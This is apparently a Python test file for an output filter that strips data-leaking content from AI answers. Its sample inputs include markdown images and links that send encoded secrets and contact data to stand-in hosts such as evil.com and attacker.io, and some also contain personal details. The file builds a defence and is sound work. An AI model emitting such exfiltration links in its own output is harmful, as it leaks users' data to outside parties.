"""Tests du controle de sortie (egress) — deterministe, aucun LLM requis."""

from aegis.gateway.egress import screen


def test_clean_answer_is_untouched():
    original = "Summary: three action items, next meeting Thursday."
    r = screen(original)
    assert r.clean
    assert r.text == original


def test_remote_markdown_image_is_removed():
    r = screen("Done. ![tracker](https://evil.com/px.png?d=c2VjcmV0)")
    assert r.images_removed == 1
    assert "evil.com" not in r.text
    assert "[image removed by Aegis]" in r.text


def test_link_with_query_string_is_removed():
    r = screen("See [the doc](https://evil.com/x?exfil=contacts) for details.")
    assert r.links_removed == 1
    assert "exfil" not in r.text


def test_raw_url_with_query_string_is_removed():
    r = screen("Backup at https://attacker.io/collect?data=abc123 now.")
    assert r.links_removed == 1
    assert "attacker.io" not in r.text


def test_plain_url_without_query_survives():
    original = "Docs: https://docs.python.org/3/library/re.html"
    r = screen(original)
    assert r.clean
    assert r.text == original


def test_pii_in_final_answer_is_masked():
    r = screen("The contact is sarah.lopez@acme.com, call +33 6 12 34 56 78.")
    assert r.pii_redacted == 2
    assert "sarah.lopez" not in r.text
